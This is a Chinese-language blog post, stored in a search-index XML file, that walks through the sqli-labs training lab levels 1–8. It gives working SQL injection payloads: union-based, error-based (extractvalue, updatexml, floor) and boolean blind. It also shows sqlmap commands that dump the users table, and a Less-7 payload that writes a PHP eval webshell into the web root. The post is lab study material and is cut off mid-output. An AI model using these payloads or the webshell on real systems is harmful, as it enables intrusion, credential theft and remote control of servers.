<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2025/07/11/sqli-labs/"/>
      <url>/2025/07/11/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="less-1："><a href="#less-1：" class="headerlink" title="less-1："></a>less-1：</h2><h3 id="（union联合注入）"><a href="#（union联合注入）" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><h4 id="step1：判断注入点类型；"><a href="#step1：判断注入点类型；" class="headerlink" title="step1：判断注入点类型；"></a>step1：判断注入点类型；</h4><p><img src="/2025/07/11/sqli-labs/2024-11-19193737.png" alt="2024-11-19 193737"></p><p>发现输入?id&#x3D;2-1与?id&#x3D;2页面回显相同，判断为字符型</p><h4 id="step2：判断闭合类型"><a href="#step2：判断闭合类型" class="headerlink" title="step2：判断闭合类型;"></a>step2：判断闭合类型;</h4><p><img src="/2025/07/11/sqli-labs/2024-11-19194240.png" alt="2024-11-19 194240"></p><p>多输入一个单引号，由报错可知是单引号闭合；</p><h4 id="Step3：判断列数；"><a href="#Step3：判断列数；" class="headerlink" title="Step3：判断列数；"></a>Step3：判断列数；</h4><p>当输入“?id&#x3D;2-1’order by 4–+”报错，把4改为3不报错，故有3列；</p><h4 id="Step4：判断回显位置；"><a href="#Step4：判断回显位置；" class="headerlink" title="Step4：判断回显位置；"></a>Step4：判断回显位置；</h4><p>***    注意：记得把id值改为不存在的值..***</p><p><img src="/2025/07/11/sqli-labs/2024-11-19194904.png" alt="2024-11-19 194904"></p><p>由回显出了2和3可以知回显位置；</p><h4 id="step5：由union-select语句得库名；"><a href="#step5：由union-select语句得库名；" class="headerlink" title="step5：由union select语句得库名；"></a>step5：由union select语句得库名；</h4><p>再输入?id&#x3D;-1’ union select 1,version(),database() –+，可知数据库版本与库名（此题的数据库为security）</p><h4 id="step6：由已知库名继续union-select得表名；"><a href="#step6：由已知库名继续union-select得表名；" class="headerlink" title="step6：由已知库名继续union select得表名；"></a>step6：由已知库名继续union select得表名；</h4><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-19195858.png" alt="2024-11-19 195858"></p><h4 id="step7：由已知库名和表名继续union-select得列名；"><a href="#step7：由已知库名和表名继续union-select得列名；" class="headerlink" title="step7：由已知库名和表名继续union select得列名；"></a>step7：由已知库名和表名继续union select得列名；</h4><p>由上步猜测目标在user表中，继续对user表进行联合注入；</p><p>语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure><p>（实际上，在先前的语句稍加修改与增添点即可）</p><p>得如下信息：</p><p><em>Welcome    Dhakkan</em><br><em>Your Login name:2</em><br><em>Your Password:id,username,password</em></p><h4 id="step8-使用列名和表名，进行查询即可；"><a href="#step8-使用列名和表名，进行查询即可；" class="headerlink" title="step8:使用列名和表名，进行查询即可；"></a>step8:使用列名和表名，进行查询即可；</h4><p>语句为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1&#x27; union select 1,2,(select group_concat(id,username,password) from users)  --+</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-19200931.png" alt="2024-11-19 200931"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h2><h3 id="（union联合注入）-1"><a href="#（union联合注入）-1" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><h4 id="step1-判断字符型或是数字型"><a href="#step1-判断字符型或是数字型" class="headerlink" title="step1:判断字符型或是数字型"></a>step1:判断字符型或是数字型</h4><p>因为?id&#x3D;2-1与?id&#x3D;1页面回显一致，知是数字型；</p><p>故不用判断闭合符号；</p><h4 id="step2：判断列数；"><a href="#step2：判断列数；" class="headerlink" title="step2：判断列数；"></a>step2：判断列数；</h4><p>与less-1同理,判断出有3列；</p><h4 id="Step3：判断回显位置；"><a href="#Step3：判断回显位置；" class="headerlink" title="Step3：判断回显位置；"></a>Step3：判断回显位置；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>与less-1同理,判断出回显位在2,3处；</p><h4 id="Step4：由union-select语句得库名"><a href="#Step4：由union-select语句得库名" class="headerlink" title="Step4：由union select语句得库名"></a>Step4：由union select语句得库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,version(),database()--+</span><br></pre></td></tr></table></figure><p>得以下信息：</p><p><em>Welcome    Dhakkan</em><br><em>Your Login name:5.7.26</em><br><em>Your Password:security</em></p><h4 id="step5：由已知库名继续union-select得表名；"><a href="#step5：由已知库名继续union-select得表名；" class="headerlink" title="step5：由已知库名继续union select得表名；"></a>step5：由已知库名继续union select得表名；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br></pre></td></tr></table></figure><p>得以下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure><h4 id="step6：由已知库名继续union-select得表名；-1"><a href="#step6：由已知库名继续union-select得表名；-1" class="headerlink" title="step6：由已知库名继续union select得表名；"></a>step6：由已知库名继续union select得表名；</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.138.128/sql/Less-2/?id=0 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+</span><br></pre></td></tr></table></figure><p>得以下信息：</p><p><em>Welcome  Dhakkan</em><br><em>Your Login name:2</em><br><em>Your Password:id,username,password</em></p><h4 id="step7-使用列名和表名，进行查询即可；"><a href="#step7-使用列名和表名，进行查询即可；" class="headerlink" title="step7:使用列名和表名，进行查询即可；"></a>step7:使用列名和表名，进行查询即可；</h4><p><img src="/2025/07/11/sqli-labs/2024-11-20061559.png" alt="2024-11-20 061559"></p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><h3 id="（union联合注入）-2"><a href="#（union联合注入）-2" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><p>1.比较输入<a href="http://127.0.0.1/sql/Less-3/?id=2-1%E4%B8%8Ehttp://127.0.0.1/sql/Less-3/?id=2">http://127.0.0.1/sql/Less-3/?id=2-1与http://127.0.0.1/sql/Less-3/?id=2</a></p><p>发现页面一致，判断为字符型；</p><p>2：输入<a href="http://127.0.0.1/sql/Less-3/?id=2%27%EF%BC%8C%E5%88%A4%E6%96%AD%E5%87%BA%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA">http://127.0.0.1/sql/Less-3/?id=2&#39;，判断出闭合方式为</a>‘)</p><p><img src="/2025/07/11/sqli-labs/2024-11-20134159.png" alt="2024-11-20 134159"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,3--+，知在2，3为回显位；</span><br><span class="line"></span><br><span class="line">4.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,version(),database()--+，知数据库名为security；</span><br><span class="line"></span><br><span class="line">5.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+，猜测表名为users；</span><br><span class="line"></span><br><span class="line">6.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+，知字段有id,username,password；</span><br><span class="line"></span><br><span class="line">7.输入http://127.0.0.1/sql/Less-3/?id=0&#x27;) union select 1,2,(select group_concat(id,username,password) from users)--+</span><br></pre></td></tr></table></figure><p>，得下图：<img src="/2025/07/11/sqli-labs/2024-11-20135444.png" alt="2024-11-20 135444"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><h3 id="（union联合注入）-3"><a href="#（union联合注入）-3" class="headerlink" title="（union联合注入）"></a>（union联合注入）</h3><p>1.判断出为字符型</p><p>2.输入<a href="http://127.0.0.1/sql/Less-4/?id=2-1%22%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%E5%9B%BE%EF%BC%8C%E5%88%A4%E6%96%AD%E5%87%BA%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA">http://127.0.0.1/sql/Less-4/?id=2-1&quot;，显示如下图，判断出闭合方式为</a>“)</p><p><img src="/2025/07/11/sqli-labs/2024-11-20140054.png" alt="2024-11-20 140054"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">4.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)--+</span><br><span class="line"></span><br><span class="line">5.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)--+</span><br><span class="line"></span><br><span class="line">6.输入http://127.0.0.1/sql/Less-4/?id=0&quot;) union select 1,2,(select group_concat(id,username,password) from users)--+</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-20141723.png" alt="2024-11-20 141723"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>less-1：考察对单引号闭合的字符型；</p><p>​            less-2：考察数字型；</p><p>字符型与数字型比较，除了少一步判断闭合符号，其余步骤相同；</p><p>​    less-3：考察对单引号加括号的字符型；</p><p>​    less-4：考察对双引号加括号的字符型；</p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="(extractvalue报错注入)"></a>(<strong>extractvalue</strong>报错注入)</h3><h4 id="step1：判断用什么注入、闭合符号-有无、有则是啥"><a href="#step1：判断用什么注入、闭合符号-有无、有则是啥" class="headerlink" title="step1：判断用什么注入、闭合符号(有无、有则是啥)"></a>step1：判断用什么注入、闭合符号(有无、有则是啥)</h4><p><img src="/2025/07/11/sqli-labs/2024-11-20201440.png" alt="2024-11-20 201440"></p><p>输入id&#x3D;1和2页面回显一致，无法用union联合注入；</p><p><img src="/2025/07/11/sqli-labs/2024-11-20201706.png" alt="2024-11-20 201706"></p><p>当多输入’<em>能显示报错信息</em>，故可以使用报错注入，且可知闭合符号为单引号；</p><h4 id="step2：若为报错注入，运用extractvalue-得库名、表名、数据"><a href="#step2：若为报错注入，运用extractvalue-得库名、表名、数据" class="headerlink" title="step2：若为报错注入，运用extractvalue()得库名、表名、数据"></a>step2：若为报错注入，运用extractvalue()得库名、表名、数据</h4><p>（注：尝试得库名、表名、数据 的方法与 由union去得 的方法同理）</p><p><strong>1.得库名：</strong></p><p>输入语句：<a href="http://127.0.0.1/sql/Less-5/?id=1">http://127.0.0.1/sql/Less-5/?id=1</a>‘ union select 1,2,extractvalue(1,concat(0x7e,database()))–+</p><p>​                                                                           （使用union select前要判断出有几列）</p><p>​           或者（更推荐）：<a href="http://127.0.0.1/sql/Less-5/?id=0">http://127.0.0.1/sql/Less-5/?id=0</a>‘ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure><p> 得下图：<img src="/2025/07/11/sqli-labs/2024-11-20204545.png" alt="2024-11-20 204545"></p><p><strong>2.得表名：</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+</span><br></pre></td></tr></table></figure><p>显示：</p><p><em>Welcome    Dhakkan</em><br><em>XPATH syntax error: ‘~emails,referers,uagents,users’</em></p><p><strong>3.得列名：</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure><p>显示：</p><p><em>Welcome    Dhakkan</em><br><em>XPATH syntax error: ‘~id,username,password’</em></p><h4 id="step3：获取数据，搭配substring"><a href="#step3：获取数据，搭配substring" class="headerlink" title="step3：获取数据，搭配substring()"></a>step3：获取数据，搭配substring()</h4><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users)))--+</span><br></pre></td></tr></table></figure><p>显示如下图：<img src="/2025/07/11/sqli-labs/2024-11-20205402.png" alt="2024-11-20 205402"></p><p>但报错注入显示的字符有限，一次只能显示32个，可以选择搭配substring()来显示更多：</p><p>故再继续输入为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),32,32) from users)))--+</span><br></pre></td></tr></table></figure><p>得下图：（后面则不断使用substring函数来继续获取）<img src="/2025/07/11/sqli-labs/2024-11-20210144.png" alt="2024-11-20 210144"></p><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><h3 id="（updatexml报错注入）"><a href="#（updatexml报错注入）" class="headerlink" title="（updatexml报错注入）"></a>（<strong>updatexml报错注入</strong>）</h3><p>1.当输入?id&#x3D;1和?id&#x3D;2页面回显相同，</p><p>而当输入：<a href="http://127.0.0.1/sql/Less-6/?id=2%22%EF%BC%8C">http://127.0.0.1/sql/Less-6/?id=2&quot;，</a></p><p>显示报错信息：<em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“2”” LIMIT 0,1’ at line 1</em></p><p>—-&gt;使用报错注入（此使用<strong>updatexml报错注入</strong>），闭合符号为双引号；</p><p>2.输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,database()),3)--+</span><br></pre></td></tr></table></figure><p>显示：<em>XPATH syntax error: ‘~security’</em></p><p>—-&gt;判断出库名为security</p><p>3.输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),3)--+</span><br></pre></td></tr></table></figure><p>显示：<em>XPATH syntax error: ‘~emails,referers,uagents,users’</em></p><p>—&gt;得表名，猜测在users表里</p><p>4.输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;)),3)--+</span><br></pre></td></tr></table></figure><p>显示：<em>XPATH syntax error: ‘~id,username,password’</em></p><p>—&gt;得列名；</p><p>5.获取数据，</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select group_concat(id,username,password) from users)),3)--+</span><br></pre></td></tr></table></figure><p>显示：<em>XPATH syntax error: ‘~1DumbDumb,2AngelinaI-kill-you,3’</em></p><p>此报错注入方式只能一次性显示32个字符，故还得搭配substr或者substring使用；</p><p>例如继续输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2&quot; and 1=updatexml(1,concat(&#x27;~&#x27;,(select substr(group_concat(id,username,password),30,60) from users)),3)--+</span><br></pre></td></tr></table></figure><p>显示如下图：<em>XPATH syntax error: ‘~,3Dummyp@ssword,4securecrappy,5’</em></p><p><img src="/2025/07/11/sqli-labs/2024-11-21170136.png" alt="2024-11-21 170136"></p><h3 id="（floor报错注入）"><a href="#（floor报错注入）" class="headerlink" title="（floor报错注入）"></a>（floor报错注入）</h3><p><strong>1</strong>.输入<a href="http://127.0.0.1/sql/Less-6/?id=7%22%EF%BC%8C">http://127.0.0.1/sql/Less-6/?id=7&quot;，</a></p><p>显示：<em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“7”” LIMIT 0,1’ at line 1</em></p><p>判断出闭合符号为双引号；</p><p><strong>2.判断列数：</strong></p><ul><li>输入<a href="http://127.0.0.1/sql/Less-6/?id=7">http://127.0.0.1/sql/Less-6/?id=7</a>“ order by 4–+<ul><li>显示<em>Unknown column ‘4’ in ‘order clause’</em>；</li></ul></li><li>输入<a href="http://127.0.0.1/sql/Less-6/?id=7">http://127.0.0.1/sql/Less-6/?id=7</a>“ order by 3–+<ul><li>正常显示<em>You are in………..</em></li></ul></li></ul><p>故列数有3列；</p><p><strong>3.查库名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,database(),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>显示：<em>Duplicate entry ‘security~1’ for key ‘’</em></p><p><strong>4.查表名：</strong></p><p>当输入 ?id&#x3D;1” union select 1,count(*),concat_ws(‘~’,(select table_name from information_schema.tables where table_schema&#x3D;’security’),floor(rand(0)*2)) as a from information_schema.tables group by a–+</p><p>显示：<em>Subquery returns more than 1 row</em></p><p>故可以加limit来限制输出的行数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>显示：<em>Duplicate entry ‘emails~1’ for key ‘’</em></p><p>后续把limit后面的第一个参数不断修改，可以不断一行一行的获取表名；</p><p>最后猜测在为users的表名里面；</p><p><strong>5.查列名：</strong></p><p>输入：（此为用limit x，1 来进行一行一行的获取，否则会显示<em>Subquery returns more than 1 row</em>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>显示：Duplicate entry ‘id~1’ for key ‘’</p><p>后续同理，各显示：</p><p><em>Duplicate entry ‘username~1’ for key ‘’</em></p><p>Duplicate entry ‘password~1’ for key ‘’</p><p><strong>6.查数据：</strong></p><p>输入 ?id&#x3D;1” union select 1,count(*),concat_ws(‘~’,(select group_concat(id,username,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a–+</p><p>显示  <em>You are in………..</em></p><p>可能是字数太多，可以把group_concat改为concat试一试：</p><p>（concat函数里可以添加‘-’等等来分隔下要显示出来的信息）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat_ws(&#x27;~&#x27;,(select concat(&#x27;-&#x27;,id,username,&#x27;:&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>显示：<em>Duplicate entry ‘-1Dumb:Dumb~1’ for key ‘’</em></p><p>后续同理，控制limit的参数即可；</p><p>例如：<img src="/2025/07/11/sqli-labs/2024-11-22110630.png"></p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h3 id="文件上传-webshell"><a href="#文件上传-webshell" class="headerlink" title="文件上传 webshell"></a>文件上传 webshell</h3><p>1.当输入?id&#x3D;1或者2，均回显：<em>You are in…. Use outfile……</em></p><p>此提示用<strong>文件上传</strong>；</p><p>2.判断闭合方式：</p><ul><li><p>?id&#x3D;1’和?id&#x3D;1’)和?id&#x3D;1’–+和?id&#x3D;1’)–+，均显示：<em>You have an error in your SQL syntax</em>   （</p><ul><li>故先排除单引号、单引号加 单括号的闭合；</li></ul></li><li><p>?id&#x3D;1” 和?id&#x3D;1” )和?id&#x3D;1’))–+ ,均不报错，均显示：<em>You are in…. Use outfile……</em></p><p>—-&gt;故应进一步验证</p><ul><li>?id&#x3D;1” and 1&#x3D;2 –+和?id&#x3D;1”) and 1&#x3D;2 –+仍不报错,但这语句本身是错的，故不是这两种闭合方式；</li><li>?id&#x3D;1’)) and 1&#x3D;2 –+会报错，而?id&#x3D;1’)) and 1&#x3D;1 –+不报错，故应该是’))的闭合方式；</li></ul></li></ul><p>3.判断列数：</p><ul><li>输入：?id&#x3D;1’)) order by 4–+ <ul><li>显示：<em>You have an error in your SQL syntax</em></li></ul></li><li>再输入：?id&#x3D;1’)) order by 3–+<ul><li>显示：<em>You are in…. Use outfile……</em></li></ul></li></ul><p> 故列数为3列；</p><p>4.进行文件上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\pass.php&quot;--+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（已知靶场路径为：C:\phpstudy_pro\WWW\sql）</p><p>虽然页面显示报错：<em>You have an error in your SQL syntax</em>，但文件若能成功上传上去即可，之后可以用webshell去查看管理；</p><p><img src="/2025/07/11/sqli-labs/2024-11-23132911.png" alt="2024-11-23 132911"></p><p>(检查确实上传到了，记得关靶场的windows实时保护，否则文件又会被删除)<img src="/2025/07/11/sqli-labs/2024-11-23133534.png" alt="2024-11-23 133534"></p><p>5.使用蚁剑：</p><p>输入信息后，点击测试连接，显示成功后则可以点击“添加”了；</p><p><img src="/2025/07/11/sqli-labs/2024-11-23133617.png" alt="2024-11-23 133617"></p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><h3 id="1-布尔盲注（简略）"><a href="#1-布尔盲注（简略）" class="headerlink" title="1.布尔盲注（简略）"></a>1.布尔盲注（简略）</h3><p>1.当为<a href="http://127.0.0.1/sql/Less-8/?id=1">http://127.0.0.1/sql/Less-8/?id=1</a>‘ and sleep(2)–+  </p><p>执行了sleep函数，说明闭合方式为单引号</p><p>（注意：若sleep不执行不代表一定不是该方式，如less-15）</p><p><img src="/2025/07/11/sqli-labs/2024-11-22164110.png" alt="2024-11-22 164110"></p><p>又易发现页面有真假两状态，可以使用布尔注入：</p><p>2.先判断数据库库名长度：</p><p>当输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))=8--+</span><br><span class="line">//注意语句不固定，参考less-15；</span><br></pre></td></tr></table></figure><p> 页面回显为真，故长度为8；</p><p>3.再判断数据库库名每个字符具体值，尝试后，发现  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=116--+</span><br></pre></td></tr></table></figure><p>页面为假，如下图：<img src="/2025/07/11/sqli-labs/2024-11-22165207.png" alt="2024-11-22 165207"></p><p>而当输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;=115--+</span><br></pre></td></tr></table></figure><p>页面为真，如下图：<img src="/2025/07/11/sqli-labs/2024-11-22165345.png" alt="2024-11-22 165345"></p><p>故可以判断出database库名的第一个字符的ASCII值为115，对应的字符为s；</p><p>注意：当然，也可以不转为ASCII再进行比较，直接对字符进行比较例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (substr(database(),1,1))=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure><p>页面显示为真；</p><p>后续同理….</p><h3 id="2-sql-map使用"><a href="#2-sql-map使用" class="headerlink" title="2.sql map使用"></a>2.sql map使用</h3><p>1.在windows 的sqlmap文件下打开cmd，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-22172313.png" alt="2024-11-22 172313"></p><p>说明此处有注入点，显示为布尔盲注or时间盲注；</p><p>2.爆库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 --dbs</span><br></pre></td></tr></table></figure><p>显示下图：<img src="/2025/07/11/sqli-labs/2024-11-22172632.png" alt="2024-11-22 172632"></p><p>猜测在security的库里；</p><p>3.爆表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; --tables</span><br></pre></td></tr></table></figure><p>显示里有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>猜测在users表里；</p><p>4.爆字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure><p>显示里有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure><p>5.爆数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-8/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure><p>显示有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 